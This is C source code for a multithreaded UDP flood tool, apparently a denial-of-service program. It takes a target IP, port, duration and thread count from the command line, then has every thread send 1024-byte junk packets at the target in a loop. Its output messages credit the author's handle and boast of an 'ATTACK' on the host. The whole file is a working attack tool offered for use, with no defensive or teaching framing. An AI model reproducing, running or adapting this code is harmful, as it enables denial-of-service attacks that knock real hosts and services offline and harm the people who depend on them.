#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define PAYLOAD_SIZE 1024

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

void* send_payload(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];

    memset(payload, 'A', PAYLOAD_SIZE - 1);
    payload[PAYLOAD_SIZE - 1] = '\0';

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            break;
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        return 1;
    }

    AttackParams params;
    strcpy(params.ip, argv[1]);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);
    int max_threads = atoi(argv[4]);

    pthread_t threads[max_threads];

    printf("MADE BY @wtf_vai %s:%d for %d seconds with %d threads...\n",
           params.ip, params.port, params.duration, max_threads);

    for (int i = 0; i < max_threads; i++) {
        if (pthread_create(&threads[i], NULL, send_payload, &params) != 0) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < max_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("FUCKED ATTACK @wtf_vai HOST IP %s on port %d for %d seconds\n",
           params.ip, params.port, params.duration);

    return 0;
}